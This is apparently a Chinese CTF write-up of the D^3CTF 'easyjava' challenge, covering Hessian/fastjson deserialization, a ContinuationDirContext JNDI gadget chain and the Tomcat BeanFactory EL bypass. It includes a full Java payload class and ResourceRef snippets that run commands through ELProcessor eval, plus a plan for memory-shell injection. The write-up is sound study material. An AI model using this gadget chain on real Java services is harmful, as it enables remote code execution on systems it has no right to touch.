---
layout: post
title: D^3CTF easyjava
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---



```java
从NEEPUCTF润来的
```

### 首先看一下server.jar这个包

```java
fastjson 2.0.24
snakeyaml 1.29
```

看见了一个黑名单，过滤了蛮多东西的

![image-20231203202446930](..\img\final\image-20231203202446930.png)

##### IndexController.class

```java
public class IndexController {
    public static List<String> denyClasses = new ArrayList();
    public static long lastTimestamp = 0;

    @GetMapping({"/status"})
    public Result status() {
        String msg;
        try {
            long currentTimestamp = System.currentTimeMillis();
            msg = String.format("client %s is online", InetAddress.getLocalHost().getHostName());
            if (currentTimestamp - lastTimestamp > AbstractComponentTracker.LINGERING_TIMEOUT) {
                update();//从这里调用update，间隔10秒
                lastTimestamp = System.currentTimeMillis();
            }
        } catch (Exception e) {
            msg = "client is online";
        }
        return Result.of("200", msg);
    }

    public void update() {
        try {                                                    //会获得注册中心 /blacklist/jdk/get路由
            Object msg = ((Result) JSON.parseObject(Request.get("http://registry:8080/blacklist/jdk/get"), (Class<Object>) Result.class)).getMessage();
            //这里不太懂什么意思，JSON解析后面这个像是黑名单而又不是
            if (msg instanceof String) {
                denyClasses = (List) DefaultSerializer.deserialize(Base64.getDecoder().decode((String) msg), denyClasses);
                //这里面进行了反序列化msg，但是经历了黑名单，msg又是通过上面json解析获得，所以后面那个路径肯定有问题？？？	
            } else if (msg instanceof List) {
                denyClasses = (List) msg;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### register.jar

```java
springboot 2.6.7
hessian 4.0.4
fastjson 2.0.24
```

可以发现版本都是比较高的，并且也给出了二个黑名单

![image-20231203204634980](..\img\final\image-20231203204634980.png)

#### MainController

服务端有一个    @GetMapping({"/status"} 路由，

```java
public class MainController {
    @GetMapping({"/"})
    @Operation(description = "hello for all")
    public String hello() {
        return "hello";
    }

    @GetMapping({"/client/status"})
    @Operation(description = "registry will request client '/status' to get client status.")
    public Result clientStatus() {
        try {  //这里会转到服务器的/status路径
            return (Result) JSON.parseObject(Request.get("http://server:8080/status"), (Class<Object>) Result.class);
        } catch (Exception e) {
            return Result.of("500", "client is down");
        }
    }

      

    @GetMapping({"/blacklist/hessian/get"})
    @Operation(description = "get serialized blacklist for registry")
    public Result getHessianBlacklist() { //这里会对hessian进行序列化
        String data;
        try {
            data = DefaultSerializer.serialize(Blacklist.hessianBlackList);
        } catch (Exception e) {
            data = e.getMessage();
        }
        return Result.of("200", data);
    }

    @PostMapping({"/hessian/deserialize"})
    @Operation(description = "deserialize base64Str using hessian")
    //这里的传参可控，但最终也会进行一个hessian黑名单的过滤器
    public Result deserialize(String base64Str) {
        String data;
        String code = "200";
        try {
            HessianSerializer.deserialize(Base64.getDecoder().decode(base64Str));
            data = "deserialize success";
        } catch (Exception e) {
            data = "error: " + e.getMessage();
            code = "500";
        }
        return Result.of(code, data);
    }
}
```

这道题给我的感觉不像是普通java题目的一个淳朴的绕过黑名单即可，更像是通过某种方式把黑名单搞没。

没办法，根本绕补过去。。。。

重新寻找一个getter----------JNDI#lookup的链子，绕过黑名单

```java
match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
return path
```

### ContinuationDirContext

师傅们找到了这个方法

javax.util.spi.ContinuationDirContext,注意这个类是私有的只能在本包中被调用

```java
match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.CLASSNAME =~"javax.naming.spi.*"  and m2.VUL="JNDI" and m2.NAME="lookup"
return path
```

![image-20231205183854471](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205183854471.png)

首先在getEnvironment方法中，调用了getTargetContext方法

![image-20231205185648462](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205185648462.png)

跟进getTargetContext方法，发现调用了`javax.naming.spi.NamingManager#getcontext`方法

![image-20231205195416575](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205195416575.png)

并且会调用它的`getObjectInstance`方法

这里需要让refInfo时 Reference的实现类，下面才能满足条件!=null然后进行`getObjectFactoryFromReference`方法

![image-20231205195802346](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205195802346.png)

跟进，它会先调用`helper.loadClass(String factoryName)`尝试加载本地的工厂类，出错或找不到指定的工厂类后，再调用`helper.loadClass(String className, String codebase)`尝试加载远程的工厂类

`javax.naming.spi.NamingManager`

```java
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
```

### 没打通卡在了最后的EL表达式那里，其实发现后面类加载啥的和高版本jndi基本一样所以趁机来温习一下

先调试到BeanFactory的链子

首先obj拼接字符会触发对应的tostring方法，这个前面就遇到过了 

![image-20231205210401926](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205210401926.png)

```java
package com.example.registry.data;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;

import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class payload {
    public static void main(String[] args) throws Exception {




        //ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
//        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
//        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));

        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //这里就是对ResourceRef对象进行一个赋值，并且factorylocation为null

        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));



        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);

        CannotProceedException cpe = new CannotProceedException();
        setFieldValue(cpe, "cause", null);
        setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(resourceRef);

        setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());

        JSONObject jo = new JSONObject();
        jo.put("test", ctx);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(jo);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
```

为什么需要jdk高版本注入

```java
因为JDK在RMI和LDAP的trustURLCodebase做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制。
所以修复后的JDK版本无法在不修改trustURLCodebase的情况下通过远程加载ObjectFactory类的方式去执行Java代码。
```

### BeanFactory绕过原理

```java
EL和Groovy之所以能打是因为LDAP和RMI在收到服务端反序列化来的Reference对象后根据classFactory属性从本地classpath中实例化一个 ObjectFactory 对象，然后调用这个对象的 getObjectInstance 方法。

在Tomcat的catalina.jar中有一个org.apache.naming.factory.BeanFactory类，这个类会把Reference对象的className属性作为类名去调用无参构造方法实例化一个对象。然后再从Reference对象的Addrs参数集合中取得 AddrType 是 forceString 的 String 参数。

接着根据取到的 forceString 参数按照,逗号分割成多个要执行的方法。再按=等于号分割成 propName 和 param。

最后会根据 propName 作为方法名称去反射获取一个参数类型是 String.class的方法，并按照 param 从 Addrs 中取到的 String 对象作为参数去反射调用该方法。

而刚好javax.el.ELProcessor#eval和 groovy.lang.GroovyShell#evaluate这两个方法都是可以只传一个String参数就能够执行攻击代码，且依赖库比较常见所以被经常使用。
```

```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
        true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));

ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
return ref
```

依照上面的原理解释，这段代码得到的ResourceRef对象在JNDI客户端处理时，实际上等价于下面这段代码。

```java
new javax.el.ELProcessor().eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")")
```

参考文章：https://tttang.com/archive/1405/#toc_druid

```java
eval:54, ELProcessor (javax.el)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
getObjectInstance:211, BeanFactory (org.apache.naming.factory)
getObjectInstance:321, NamingManager (javax.naming.spi)
getContext:439, NamingManager (javax.naming.spi)
getTargetContext:55, ContinuationContext (javax.naming.spi)
getEnvironment:197, ContinuationContext (javax.naming.spi)
apply:-1, 1541049864 (javax.naming.spi.ContinuationDirContext$$Lambda$25)
getFieldValue:36, FieldWriterObjectFunc (com.alibaba.fastjson2.writer)
write:189, FieldWriterObject (com.alibaba.fastjson2.writer)
write:76, ObjectWriter2 (com.alibaba.fastjson2.writer)
write:548, ObjectWriterImplMap (com.alibaba.fastjson2.writer)
toJSONString:2388, JSON (com.alibaba.fastjson2)
toString:1028, JSONObject (com.alibaba.fastjson)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:3757, Hessian2Input (com.caucho.hessian.io)
readString:1979, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2960, Hessian2Input (com.caucho.hessian.io)
readObject:2893, Hessian2Input (com.caucho.hessian.io)
```







## 最后的疑问

看wp说直接打内存吗，但是这不是Templates的内存马嘛，哪能直接打内存吗？

这道题大概的逻辑就是通过上传了一个内存吗，然后重置黑名单

然后后面加载一个高版本jndi注入，Reference注入

![image-20231206225239175](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231206225239175.png)



打poc流程

```java
1、首先在客户端通过/hessian/deserialize路由打一个 jdni高版本reference注入，然后打一个内存吗，用来去清空黑名单
2、访问    @GetMapping({"/status"})  服务器的这个，然后就会跳转到客户端进行读取黑名单，这时候我们的内存马已经置空黑名单了，所有就可以直接打 templates内存吗注入了
    
打二个内存吗主要是因为服务器、客户端时二个容器，并且服务端时真正的flag，客户端是可以直接打hessian链子的，但是客户端的没啥用
```

接下来就是实践部分







